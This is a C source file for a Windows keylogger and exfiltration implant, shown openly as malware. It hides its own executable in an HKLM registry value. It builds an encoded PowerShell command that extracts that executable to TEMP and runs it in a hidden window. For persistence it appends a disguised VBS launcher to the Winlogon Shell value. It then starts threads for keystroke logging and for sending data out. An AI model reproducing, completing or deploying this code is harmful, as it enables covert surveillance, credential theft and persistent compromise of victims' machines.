#include <winsock2.h>
#include "libs/winexfil.h"
#include "winconsts.h"
#include "libs/winkeylog.h"
#include "libs/winencode.h"
#include "libs/winvbs.h"
#include "gamble.c"
#include <windows.h>
#include <stdio.h>

int isInRegistry() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    return (strstr(szPath, "TEMP") != NULL || strstr(szPath, PROC_NAME) != NULL);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    char cmd[512];
	snprintf(cmd, sizeof(cmd), 
    	"$b=(Get-ItemProperty 'Registry::HKEY_LOCAL_MACHINE\\%s').DEBUG;"
    	"$p=\"$env:TEMP\\%s\";[IO.File]::WriteAllBytes($p,$b);"
    	"Start-Process $p -WindowStyle Hidden", MAIN_REGISTRY, PROC_NAME);
	const char* encodedPayload = encodeForPowerShell(cmd);
    if (isInRegistry()) {
		if (!hasVBS()) { dropVBS(encodedPayload); }
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKey, NULL, 0, NULL);
		HANDLE hExfilThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exfilThread, NULL, 0, NULL);
        HANDLE hWheelThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WheelThread, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		return 0;
	}
    // write entire exe to registry
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    FILE* file = fopen(szPath, "rb");
    if (!file) return 0;
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    fread(buffer, 1, fileSize, file);
    fclose(file);
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, MAIN_REGISTRY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DEBUG", 0, REG_BINARY, buffer, fileSize);
        RegCloseKey(hKey);
    }
    free(buffer);
    // create vbs and write to registry
    dropVBS(encodedPayload);
    char currentShell[512], newShell[1024];
    DWORD dwSize = sizeof(currentShell);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, ACTIVATE_REGISTRY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "Shell", NULL, NULL, (LPBYTE)currentShell, &dwSize) == ERROR_SUCCESS) {
            if (strstr(currentShell, "wininit.ini.vbs") == NULL) {
                snprintf(newShell, sizeof(newShell), "%s, wscript.exe \"%s\"", currentShell, VBS_PATH);
                RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)newShell, strlen(newShell) + 1);
            }
        }
        RegCloseKey(hKey);
    }
    // dont run these while in ansible
    // char vbscmd[MAX_PATH + 30];
    // snprintf(vbscmd, sizeof(vbscmd), "wscript.exe //B \"%s\"", VBS_PATH);

    // WinExec(vbscmd, 0);
    return 0;
}